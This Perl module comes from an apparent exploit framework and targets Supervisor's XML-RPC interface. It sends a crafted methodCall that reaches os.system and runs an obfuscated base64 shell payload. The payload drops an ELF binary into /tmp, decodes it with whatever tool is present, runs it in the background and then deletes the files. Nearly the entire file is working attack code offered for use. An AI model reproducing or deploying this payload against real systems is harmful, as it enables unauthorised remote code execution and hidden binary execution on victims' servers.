package P1rK3r::Exploits::SUPERVISOR::MSF::SupervisorXmlrpcExec;
use parent qw(P1rK3r::Exploit P1rK3r::Services::SUPERVISOR);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SupervisorXmlrpcExec";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'ALL',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '<?xml version="1.0"?>
<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
    <param>
      <string>echo -n ZWNobyAtbiBmMFZNUmdFQkFRQUFBQUFBQUFBQUFBSUFBd0FCQUFBQVZJQUVDRFFBQUFBQUFBQUFBQUFBQURRQUlBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFJQUVDQUNBQkFoZkFBQUFhZ0FBQUFjQUFBQUFFQUFBWDE5UVFWbE1UMEZFWDE4PT4+Jy90bXAvVmFoUHIuYjY0JyA7ICgod2hpY2ggYmFzZTY0ID4mMiAmJiBiYXNlNjQgLS1kZWNvZGUgLSkgfHwgKHdoaWNoIG9wZW5zc2wgPiYyICYmIG9wZW5zc2wgZW5jIC1kIC1BIC1iYXNlNjQgLWluIC9kZXYvc3RkaW4pIHx8ICh3aGljaCBweXRob24gPiYyICYmIHB5dGhvbiAtYyAnaW1wb3J0IHN5cywgYmFzZTY0OyBwcmludCBiYXNlNjQuc3RhbmRhcmRfYjY0ZGVjb2RlKHN5cy5zdGRpbi5yZWFkKCkpOycpIHx8ICh3aGljaCBwZXJsID4mMiAmJiBwZXJsIC1NTUlNRTo6QmFzZTY0IC1uZSAncHJpbnQgZGVjb2RlX2Jhc2U2NCgkXyknKSkgMj4gL2Rldi9udWxsID4gJy90bXAvcHdndm4nIDwgJy90bXAvVmFoUHIuYjY0JyA7IGNobW9kICt4ICcvdG1wL3B3Z3ZuJyA7ICcvdG1wL3B3Z3ZuJyA7IHJtIC1mICcvdG1wL3B3Z3ZuJyA7IHJtIC1mICcvdG1wL1ZhaFByLmI2NCc=|base64 -d|nohup bash > /dev/null 2>&amp;1 &amp;</string>
    </param>
  </params>
</methodCall>',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /',
                        HEADERS      => {
                           'Content-Type' => 'text/xml',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
